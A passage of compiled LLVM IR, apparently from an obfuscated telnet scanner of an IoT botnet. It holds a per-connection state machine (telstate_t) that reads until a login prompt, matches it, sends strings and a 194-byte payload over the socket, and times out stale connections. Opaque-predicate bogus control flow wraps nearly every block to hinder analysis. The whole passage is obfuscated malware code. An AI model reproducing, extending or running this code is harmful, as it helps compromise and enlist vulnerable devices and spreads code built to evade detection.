  %2354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2353, i32 0, i32 2
  store i8 0, i8* %2354, align 8
  %2355 = load i32, i32* %10, align 4
  %2356 = sext i32 %2355 to i64
  %2357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2356
  %2358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2357, i32 0, i32 3
  store i8 1, i8* %2358, align 1
  br label %2839

; <label>:2359:                                   ; preds = %2331
  %2360 = load i32, i32* %10, align 4
  %2361 = sext i32 %2360 to i64
  %2362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2361
  %2363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2362, i32 0, i32 2
  store i8 7, i8* %2363, align 8
  br label %2364

; <label>:2364:                                   ; preds = %2359
  %2365 = load i32, i32* @x.65
  %2366 = load i32, i32* @y.66
  %2367 = sub i32 %2365, 1
  %2368 = mul i32 %2365, %2367
  %2369 = urem i32 %2368, 2
  %2370 = icmp eq i32 %2369, 0
  %2371 = icmp slt i32 %2366, 10
  %2372 = or i1 %2370, %2371
  br i1 %2372, label %originalBB206, label %originalBB206alteredBB

originalBB206:                                    ; preds = %originalBB206alteredBB, %2364
  %2373 = load i32, i32* %10, align 4
  %2374 = sext i32 %2373 to i64
  %2375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2374
  %2376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2375, i32 0, i32 8
  %2377 = load i8*, i8** %2376, align 8
  call void @llvm.memset.p0i8.i64(i8* %2377, i8 0, i64 1024, i32 1, i1 false)
  %2378 = load i32, i32* @x.65
  %2379 = load i32, i32* @y.66
  %2380 = sub i32 %2378, 1
  %2381 = mul i32 %2378, %2380
  %2382 = urem i32 %2381, 2
  %2383 = icmp eq i32 %2382, 0
  %2384 = icmp slt i32 %2379, 10
  %2385 = or i1 %2383, %2384
  br i1 %2385, label %originalBBpart2208, label %originalBB206alteredBB

originalBBpart2208:                               ; preds = %originalBB206
  br label %2839

; <label>:2386:                                   ; preds = %originalBBpart2204
  %2387 = load i32, i32* %10, align 4
  %2388 = sext i32 %2387 to i64
  %2389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2388
  %2390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2389, i32 0, i32 0
  %2391 = load i32, i32* %2390, align 16
  %2392 = load i32, i32* %10, align 4
  %2393 = sext i32 %2392 to i64
  %2394 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2393
  %2395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2394, i32 0, i32 8
  %2396 = load i8*, i8** %2395, align 8
  %2397 = load i32, i32* %10, align 4
  %2398 = sext i32 %2397 to i64
  %2399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2398
  %2400 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2399, i32 0, i32 7
  %2401 = load i16, i16* %2400, align 16
  %2402 = zext i16 %2401 to i32
  %2403 = call i32 @readUntil(i32 %2391, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %2396, i32 1024, i32 %2402)
  %2404 = icmp ne i32 %2403, 0
  br i1 %2404, label %2405, label %2528

; <label>:2405:                                   ; preds = %2386
  %2406 = load i32, i32* @x.65
  %2407 = load i32, i32* @y.66
  %2408 = sub i32 %2406, 1
  %2409 = mul i32 %2406, %2408
  %2410 = urem i32 %2409, 2
  %2411 = icmp eq i32 %2410, 0
  %2412 = icmp slt i32 %2407, 10
  %2413 = or i1 %2411, %2412
  br i1 %2413, label %originalBB210, label %originalBB210alteredBB

originalBB210:                                    ; preds = %originalBB210alteredBB, %2405
  %2414 = load i32, i32* %10, align 4
  %2415 = sext i32 %2414 to i64
  %2416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2415
  %2417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2416, i32 0, i32 6
  store i32 0, i32* %2417, align 4
  %2418 = load i32, i32* %10, align 4
  %2419 = sext i32 %2418 to i64
  %2420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2419
  %2421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2420, i32 0, i32 7
  store i16 0, i16* %2421, align 16
  %2422 = load i32, i32* %10, align 4
  %2423 = sext i32 %2422 to i64
  %2424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2423
  %2425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2424, i32 0, i32 8
  %2426 = load i8*, i8** %2425, align 8
  %2427 = call i8* @strstr(i8* %2426, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0)) #10
  %2428 = icmp ne i8* %2427, null
  %2429 = load i32, i32* @x.65
  %2430 = load i32, i32* @y.66
  %2431 = sub i32 %2429, 1
  %2432 = mul i32 %2429, %2431
  %2433 = urem i32 %2432, 2
  %2434 = icmp eq i32 %2433, 0
  %2435 = icmp slt i32 %2430, 10
  %2436 = or i1 %2434, %2435
  br i1 %2436, label %originalBBpart2212, label %originalBB210alteredBB

originalBBpart2212:                               ; preds = %originalBB210
  br i1 %2428, label %2437, label %2457

; <label>:2437:                                   ; preds = %originalBBpart2212
  %2438 = load i32, i32* %10, align 4
  %2439 = sext i32 %2438 to i64
  %2440 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2439
  %2441 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2440, i32 0, i32 8
  %2442 = load i8*, i8** %2441, align 8
  call void @llvm.memset.p0i8.i64(i8* %2442, i8 0, i64 1024, i32 1, i1 false)
  %2443 = load i32, i32* %10, align 4
  %2444 = sext i32 %2443 to i64
  %2445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2444
  %2446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2445, i32 0, i32 0
  %2447 = load i32, i32* %2446, align 16
  %2448 = call i32 @sclose(i32 %2447)
  %2449 = load i32, i32* %10, align 4
  %2450 = sext i32 %2449 to i64
  %2451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2450
  %2452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2451, i32 0, i32 2
  store i8 0, i8* %2452, align 8
  %2453 = load i32, i32* %10, align 4
  %2454 = sext i32 %2453 to i64
  %2455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2454
  %2456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2455, i32 0, i32 3
  store i8 0, i8* %2456, align 1
  br label %2839

; <label>:2457:                                   ; preds = %originalBBpart2212
  %2458 = load i32, i32* %10, align 4
  %2459 = sext i32 %2458 to i64
  %2460 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2459
  %2461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2460, i32 0, i32 8
  %2462 = load i8*, i8** %2461, align 8
  %2463 = call i32 @matchPrompt(i8* %2462)
  %2464 = icmp ne i32 %2463, 0
  br i1 %2464, label %2485, label %2465

; <label>:2465:                                   ; preds = %2457
  %2466 = load i32, i32* %10, align 4
  %2467 = sext i32 %2466 to i64
  %2468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2467
  %2469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2468, i32 0, i32 8
  %2470 = load i8*, i8** %2469, align 8
  call void @llvm.memset.p0i8.i64(i8* %2470, i8 0, i64 1024, i32 1, i1 false)
  %2471 = load i32, i32* %10, align 4
  %2472 = sext i32 %2471 to i64
  %2473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2472
  %2474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2473, i32 0, i32 0
  %2475 = load i32, i32* %2474, align 16
  %2476 = call i32 @sclose(i32 %2475)
  %2477 = load i32, i32* %10, align 4
  %2478 = sext i32 %2477 to i64
  %2479 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2478
  %2480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2479, i32 0, i32 2
  store i8 0, i8* %2480, align 8
  %2481 = load i32, i32* %10, align 4
  %2482 = sext i32 %2481 to i64
  %2483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2482
  %2484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2483, i32 0, i32 3
  store i8 1, i8* %2484, align 1
  br label %2839

; <label>:2485:                                   ; preds = %2457
  %2486 = load i32, i32* @x.65
  %2487 = load i32, i32* @y.66
  %2488 = sub i32 %2486, 1
  %2489 = mul i32 %2486, %2488
  %2490 = urem i32 %2489, 2
  %2491 = icmp eq i32 %2490, 0
  %2492 = icmp slt i32 %2487, 10
  %2493 = or i1 %2491, %2492
  br i1 %2493, label %originalBB214, label %originalBB214alteredBB

originalBB214:                                    ; preds = %originalBB214alteredBB, %2485
  %2494 = load i32, i32* %10, align 4
  %2495 = sext i32 %2494 to i64
  %2496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2495
  %2497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2496, i32 0, i32 2
  store i8 7, i8* %2497, align 8
  %2498 = load i32, i32* @x.65
  %2499 = load i32, i32* @y.66
  %2500 = sub i32 %2498, 1
  %2501 = mul i32 %2498, %2500
  %2502 = urem i32 %2501, 2
  %2503 = icmp eq i32 %2502, 0
  %2504 = icmp slt i32 %2499, 10
  %2505 = or i1 %2503, %2504
  br i1 %2505, label %originalBBpart2216, label %originalBB214alteredBB

originalBBpart2216:                               ; preds = %originalBB214
  br label %2506

; <label>:2506:                                   ; preds = %originalBBpart2216
  %2507 = load i32, i32* @x.65
  %2508 = load i32, i32* @y.66
  %2509 = sub i32 %2507, 1
  %2510 = mul i32 %2507, %2509
  %2511 = urem i32 %2510, 2
  %2512 = icmp eq i32 %2511, 0
  %2513 = icmp slt i32 %2508, 10
  %2514 = or i1 %2512, %2513
  br i1 %2514, label %originalBB218, label %originalBB218alteredBB

originalBB218:                                    ; preds = %originalBB218alteredBB, %2506
  %2515 = load i32, i32* %10, align 4
  %2516 = sext i32 %2515 to i64
  %2517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2516
  %2518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2517, i32 0, i32 8
  %2519 = load i8*, i8** %2518, align 8
  call void @llvm.memset.p0i8.i64(i8* %2519, i8 0, i64 1024, i32 1, i1 false)
  %2520 = load i32, i32* @x.65
  %2521 = load i32, i32* @y.66
  %2522 = sub i32 %2520, 1
  %2523 = mul i32 %2520, %2522
  %2524 = urem i32 %2523, 2
  %2525 = icmp eq i32 %2524, 0
  %2526 = icmp slt i32 %2521, 10
  %2527 = or i1 %2525, %2526
  br i1 %2527, label %originalBBpart2220, label %originalBB218alteredBB

originalBBpart2220:                               ; preds = %originalBB218
  br label %2839

; <label>:2528:                                   ; preds = %2386
  %2529 = load i32, i32* @x.65
  %2530 = load i32, i32* @y.66
  %2531 = sub i32 %2529, 1
  %2532 = mul i32 %2529, %2531
  %2533 = urem i32 %2532, 2
  %2534 = icmp eq i32 %2533, 0
  %2535 = icmp slt i32 %2530, 10
  %2536 = or i1 %2534, %2535
  br i1 %2536, label %originalBB222, label %originalBB222alteredBB

originalBB222:                                    ; preds = %originalBB222alteredBB, %2528
  %2537 = load i32, i32* %10, align 4
  %2538 = sext i32 %2537 to i64
  %2539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2538
  %2540 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2539, i32 0, i32 8
  %2541 = load i8*, i8** %2540, align 8
  %2542 = call i64 @strlen(i8* %2541) #10
  %2543 = trunc i64 %2542 to i16
  %2544 = load i32, i32* %10, align 4
  %2545 = sext i32 %2544 to i64
  %2546 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2545
  %2547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2546, i32 0, i32 7
  store i16 %2543, i16* %2547, align 16
  %2548 = load i32, i32* @x.65
  %2549 = load i32, i32* @y.66
  %2550 = sub i32 %2548, 1
  %2551 = mul i32 %2548, %2550
  %2552 = urem i32 %2551, 2
  %2553 = icmp eq i32 %2552, 0
  %2554 = icmp slt i32 %2549, 10
  %2555 = or i1 %2553, %2554
  br i1 %2555, label %originalBBpart2224, label %originalBB222alteredBB

originalBBpart2224:                               ; preds = %originalBB222
  br label %2556

; <label>:2556:                                   ; preds = %originalBBpart2224
  br label %2557

; <label>:2557:                                   ; preds = %2556
  %2558 = load i32, i32* @x.65
  %2559 = load i32, i32* @y.66
  %2560 = sub i32 %2558, 1
  %2561 = mul i32 %2558, %2560
  %2562 = urem i32 %2561, 2
  %2563 = icmp eq i32 %2562, 0
  %2564 = icmp slt i32 %2559, 10
  %2565 = or i1 %2563, %2564
  br i1 %2565, label %originalBB226, label %originalBB226alteredBB

originalBB226:                                    ; preds = %originalBB226alteredBB, %2557
  %2566 = load i32, i32* @x.65
  %2567 = load i32, i32* @y.66
  %2568 = sub i32 %2566, 1
  %2569 = mul i32 %2566, %2568
  %2570 = urem i32 %2569, 2
  %2571 = icmp eq i32 %2570, 0
  %2572 = icmp slt i32 %2567, 10
  %2573 = or i1 %2571, %2572
  br i1 %2573, label %originalBBpart2228, label %originalBB226alteredBB

originalBBpart2228:                               ; preds = %originalBB226
  br label %2574

; <label>:2574:                                   ; preds = %originalBBpart2228
  br label %2575

; <label>:2575:                                   ; preds = %2574
  br label %2576

; <label>:2576:                                   ; preds = %2575
  br label %2577

; <label>:2577:                                   ; preds = %2576
  br label %2578

; <label>:2578:                                   ; preds = %2577
  %2579 = load i32, i32* @x.65
  %2580 = load i32, i32* @y.66
  %2581 = sub i32 %2579, 1
  %2582 = mul i32 %2579, %2581
  %2583 = urem i32 %2582, 2
  %2584 = icmp eq i32 %2583, 0
  %2585 = icmp slt i32 %2580, 10
  %2586 = or i1 %2584, %2585
  br i1 %2586, label %originalBB230, label %originalBB230alteredBB

originalBB230:                                    ; preds = %originalBB230alteredBB, %2578
  %2587 = load i32, i32* @x.65
  %2588 = load i32, i32* @y.66
  %2589 = sub i32 %2587, 1
  %2590 = mul i32 %2587, %2589
  %2591 = urem i32 %2590, 2
  %2592 = icmp eq i32 %2591, 0
  %2593 = icmp slt i32 %2588, 10
  %2594 = or i1 %2592, %2593
  br i1 %2594, label %originalBBpart2232, label %originalBB230alteredBB

originalBBpart2232:                               ; preds = %originalBB230
  br label %2595

; <label>:2595:                                   ; preds = %originalBBpart2232
  %2596 = load i32, i32* @x.65
  %2597 = load i32, i32* @y.66
  %2598 = sub i32 %2596, 1
  %2599 = mul i32 %2596, %2598
  %2600 = urem i32 %2599, 2
  %2601 = icmp eq i32 %2600, 0
  %2602 = icmp slt i32 %2597, 10
  %2603 = or i1 %2601, %2602
  br i1 %2603, label %originalBB234, label %originalBB234alteredBB

originalBB234:                                    ; preds = %originalBB234alteredBB, %2595
  %2604 = load i32, i32* %10, align 4
  %2605 = sext i32 %2604 to i64
  %2606 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2605
  %2607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2606, i32 0, i32 6
  %2608 = load i32, i32* %2607, align 4
  %2609 = add i32 %2608, 10
  %2610 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %2611 = icmp ult i32 %2609, %2610
  %2612 = load i32, i32* @x.65
  %2613 = load i32, i32* @y.66
  %2614 = sub i32 %2612, 1
  %2615 = mul i32 %2612, %2614
  %2616 = urem i32 %2615, 2
  %2617 = icmp eq i32 %2616, 0
  %2618 = icmp slt i32 %2613, 10
  %2619 = or i1 %2617, %2618
  br i1 %2619, label %originalBBpart2246, label %originalBB234alteredBB

originalBBpart2246:                               ; preds = %originalBB234
  br i1 %2611, label %2620, label %2651

; <label>:2620:                                   ; preds = %originalBBpart2246
  %2621 = load i32, i32* @x.65
  %2622 = load i32, i32* @y.66
  %2623 = sub i32 %2621, 1
  %2624 = mul i32 %2621, %2623
  %2625 = urem i32 %2624, 2
  %2626 = icmp eq i32 %2625, 0
  %2627 = icmp slt i32 %2622, 10
  %2628 = or i1 %2626, %2627
  br i1 %2628, label %originalBB248, label %originalBB248alteredBB

originalBB248:                                    ; preds = %originalBB248alteredBB, %2620
  %2629 = load i32, i32* %10, align 4
  %2630 = sext i32 %2629 to i64
  %2631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2630
  %2632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2631, i32 0, i32 0
  %2633 = load i32, i32* %2632, align 16
  %2634 = call i32 @sclose(i32 %2633)
  %2635 = load i32, i32* %10, align 4
  %2636 = sext i32 %2635 to i64
  %2637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2636
  %2638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2637, i32 0, i32 2
  store i8 0, i8* %2638, align 8
  %2639 = load i32, i32* %10, align 4
  %2640 = sext i32 %2639 to i64
  %2641 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2640
  %2642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2641, i32 0, i32 3
  store i8 1, i8* %2642, align 1
  %2643 = load i32, i32* @x.65
  %2644 = load i32, i32* @y.66
  %2645 = sub i32 %2643, 1
  %2646 = mul i32 %2643, %2645
  %2647 = urem i32 %2646, 2
  %2648 = icmp eq i32 %2647, 0
  %2649 = icmp slt i32 %2644, 10
  %2650 = or i1 %2648, %2649
  br i1 %2650, label %originalBBpart2250, label %originalBB248alteredBB

originalBBpart2250:                               ; preds = %originalBB248
  br label %2651

; <label>:2651:                                   ; preds = %originalBBpart2250, %originalBBpart2246
  br label %2838

; <label>:2652:                                   ; preds = %116
  %2653 = load i32, i32* @x.65
  %2654 = load i32, i32* @y.66
  %2655 = sub i32 %2653, 1
  %2656 = mul i32 %2653, %2655
  %2657 = urem i32 %2656, 2
  %2658 = icmp eq i32 %2657, 0
  %2659 = icmp slt i32 %2654, 10
  %2660 = or i1 %2658, %2659
  br i1 %2660, label %originalBB252, label %originalBB252alteredBB

originalBB252:                                    ; preds = %originalBB252alteredBB, %2652
  %2661 = load i32, i32* %10, align 4
  %2662 = sext i32 %2661 to i64
  %2663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2662
  %2664 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2663, i32 0, i32 0
  %2665 = load i32, i32* %2664, align 16
  %2666 = call i64 @send(i32 %2665, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i32 0, i32 0), i64 4, i32 16384)
  %2667 = icmp slt i64 %2666, 0
  %2668 = load i32, i32* @x.65
  %2669 = load i32, i32* @y.66
  %2670 = sub i32 %2668, 1
  %2671 = mul i32 %2668, %2670
  %2672 = urem i32 %2671, 2
  %2673 = icmp eq i32 %2672, 0
  %2674 = icmp slt i32 %2669, 10
  %2675 = or i1 %2673, %2674
  br i1 %2675, label %originalBBpart2254, label %originalBB252alteredBB

originalBBpart2254:                               ; preds = %originalBB252
  br i1 %2667, label %2676, label %2691

; <label>:2676:                                   ; preds = %originalBBpart2254
  %2677 = load i32, i32* %10, align 4
  %2678 = sext i32 %2677 to i64
  %2679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2678
  %2680 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2679, i32 0, i32 0
  %2681 = load i32, i32* %2680, align 16
  %2682 = call i32 @sclose(i32 %2681)
  %2683 = load i32, i32* %10, align 4
  %2684 = sext i32 %2683 to i64
  %2685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2684
  %2686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2685, i32 0, i32 2
  store i8 0, i8* %2686, align 8
  %2687 = load i32, i32* %10, align 4
  %2688 = sext i32 %2687 to i64
  %2689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2688
  %2690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2689, i32 0, i32 3
  store i8 1, i8* %2690, align 1
  br label %2839

; <label>:2691:                                   ; preds = %originalBBpart2254
  %2692 = load i32, i32* %10, align 4
  %2693 = sext i32 %2692 to i64
  %2694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2693
  %2695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2694, i32 0, i32 2
  store i8 8, i8* %2695, align 8
  br label %2838

; <label>:2696:                                   ; preds = %116
  %2697 = load i32, i32* @x.65
  %2698 = load i32, i32* @y.66
  %2699 = sub i32 %2697, 1
  %2700 = mul i32 %2697, %2699
  %2701 = urem i32 %2700, 2
  %2702 = icmp eq i32 %2701, 0
  %2703 = icmp slt i32 %2698, 10
  %2704 = or i1 %2702, %2703
  br i1 %2704, label %originalBB256, label %originalBB256alteredBB

originalBB256:                                    ; preds = %originalBB256alteredBB, %2696
  %2705 = load i32, i32* %10, align 4
  %2706 = sext i32 %2705 to i64
  %2707 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2706
  %2708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2707, i32 0, i32 0
  %2709 = load i32, i32* %2708, align 16
  %2710 = call i64 @send(i32 %2709, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.43, i32 0, i32 0), i64 9, i32 16384)
  %2711 = icmp slt i64 %2710, 0
  %2712 = load i32, i32* @x.65
  %2713 = load i32, i32* @y.66
  %2714 = sub i32 %2712, 1
  %2715 = mul i32 %2712, %2714
  %2716 = urem i32 %2715, 2
  %2717 = icmp eq i32 %2716, 0
  %2718 = icmp slt i32 %2713, 10
  %2719 = or i1 %2717, %2718
  br i1 %2719, label %originalBBpart2259, label %originalBB256alteredBB

originalBBpart2259:                               ; preds = %originalBB256
  br i1 %2711, label %2720, label %2735

; <label>:2720:                                   ; preds = %originalBBpart2259
  %2721 = load i32, i32* %10, align 4
  %2722 = sext i32 %2721 to i64
  %2723 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2722
  %2724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2723, i32 0, i32 0
  %2725 = load i32, i32* %2724, align 16
  %2726 = call i32 @sclose(i32 %2725)
  %2727 = load i32, i32* %10, align 4
  %2728 = sext i32 %2727 to i64
  %2729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2728
  %2730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2729, i32 0, i32 2
  store i8 0, i8* %2730, align 8
  %2731 = load i32, i32* %10, align 4
  %2732 = sext i32 %2731 to i64
  %2733 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2732
  %2734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2733, i32 0, i32 3
  store i8 1, i8* %2734, align 1
  br label %2839

; <label>:2735:                                   ; preds = %originalBBpart2259
  %2736 = load i32, i32* %10, align 4
  %2737 = sext i32 %2736 to i64
  %2738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2737
  %2739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2738, i32 0, i32 2
  store i8 9, i8* %2739, align 8
  br label %2838

; <label>:2740:                                   ; preds = %116
  %2741 = load i32, i32* @x.65
  %2742 = load i32, i32* @y.66
  %2743 = sub i32 %2741, 1
  %2744 = mul i32 %2741, %2743
  %2745 = urem i32 %2744, 2
  %2746 = icmp eq i32 %2745, 0
  %2747 = icmp slt i32 %2742, 10
  %2748 = or i1 %2746, %2747
  br i1 %2748, label %originalBB261, label %originalBB261alteredBB

originalBB261:                                    ; preds = %originalBB261alteredBB, %2740
  %2749 = load i32, i32* %10, align 4
  %2750 = sext i32 %2749 to i64
  %2751 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2750
  %2752 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2751, i32 0, i32 6
  %2753 = load i32, i32* %2752, align 4
  %2754 = icmp eq i32 %2753, 0
  %2755 = load i32, i32* @x.65
  %2756 = load i32, i32* @y.66
  %2757 = sub i32 %2755, 1
  %2758 = mul i32 %2755, %2757
  %2759 = urem i32 %2758, 2
  %2760 = icmp eq i32 %2759, 0
  %2761 = icmp slt i32 %2756, 10
  %2762 = or i1 %2760, %2761
  br i1 %2762, label %originalBBpart2263, label %originalBB261alteredBB

originalBBpart2263:                               ; preds = %originalBB261
  br i1 %2754, label %2763, label %2769

; <label>:2763:                                   ; preds = %originalBBpart2263
  %2764 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %2765 = load i32, i32* %10, align 4
  %2766 = sext i32 %2765 to i64
  %2767 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2766
  %2768 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2767, i32 0, i32 6
  store i32 %2764, i32* %2768, align 4
  br label %2769

; <label>:2769:                                   ; preds = %2763, %originalBBpart2263
  %2770 = load i32, i32* @x.65
  %2771 = load i32, i32* @y.66
  %2772 = sub i32 %2770, 1
  %2773 = mul i32 %2770, %2772
  %2774 = urem i32 %2773, 2
  %2775 = icmp eq i32 %2774, 0
  %2776 = icmp slt i32 %2771, 10
  %2777 = or i1 %2775, %2776
  br i1 %2777, label %originalBB265, label %originalBB265alteredBB

originalBB265:                                    ; preds = %originalBB265alteredBB, %2769
  %2778 = load i32, i32* %10, align 4
  %2779 = sext i32 %2778 to i64
  %2780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2779
  %2781 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2780, i32 0, i32 0
  %2782 = load i32, i32* %2781, align 16
  %2783 = call i64 @send(i32 %2782, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.44, i32 0, i32 0), i64 194, i32 16384)
  %2784 = icmp slt i64 %2783, 0
  %2785 = load i32, i32* @x.65
  %2786 = load i32, i32* @y.66
  %2787 = sub i32 %2785, 1
  %2788 = mul i32 %2785, %2787
  %2789 = urem i32 %2788, 2
  %2790 = icmp eq i32 %2789, 0
  %2791 = icmp slt i32 %2786, 10
  %2792 = or i1 %2790, %2791
  br i1 %2792, label %originalBBpart2267, label %originalBB265alteredBB

originalBBpart2267:                               ; preds = %originalBB265
  br i1 %2784, label %2793, label %2813

; <label>:2793:                                   ; preds = %originalBBpart2267
  %2794 = load i32, i32* %10, align 4
  %2795 = sext i32 %2794 to i64
  %2796 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2795
  %2797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2796, i32 0, i32 0
  %2798 = load i32, i32* %2797, align 16
  %2799 = call i32 @sclose(i32 %2798)
  %2800 = load i32, i32* %10, align 4
  %2801 = sext i32 %2800 to i64
  %2802 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2801
  %2803 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2802, i32 0, i32 2
  store i8 0, i8* %2803, align 8
  %2804 = load i32, i32* %10, align 4
  %2805 = sext i32 %2804 to i64
  %2806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2805
  %2807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2806, i32 0, i32 3
  store i8 1, i8* %2807, align 1
  %2808 = load i32, i32* %10, align 4
  %2809 = sext i32 %2808 to i64
  %2810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2809
  %2811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2810, i32 0, i32 8
  %2812 = load i8*, i8** %2811, align 8
  call void @llvm.memset.p0i8.i64(i8* %2812, i8 0, i64 1024, i32 1, i1 false)
  br label %2839

; <label>:2813:                                   ; preds = %originalBBpart2267
  %2814 = load i32, i32* %10, align 4
  %2815 = sext i32 %2814 to i64
  %2816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2815
  %2817 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2816, i32 0, i32 6
  %2818 = load i32, i32* %2817, align 4
  %2819 = add i32 %2818, 10
  %2820 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %2821 = icmp ult i32 %2819, %2820
  br i1 %2821, label %2822, label %2837

; <label>:2822:                                   ; preds = %2813
  %2823 = load i32, i32* %10, align 4
  %2824 = sext i32 %2823 to i64
  %2825 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2824
  %2826 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2825, i32 0, i32 0
  %2827 = load i32, i32* %2826, align 16
  %2828 = call i32 @sclose(i32 %2827)
  %2829 = load i32, i32* %10, align 4
  %2830 = sext i32 %2829 to i64
  %2831 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2830
  %2832 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2831, i32 0, i32 2
  store i8 0, i8* %2832, align 8
  %2833 = load i32, i32* %10, align 4
  %2834 = sext i32 %2833 to i64
  %2835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2834
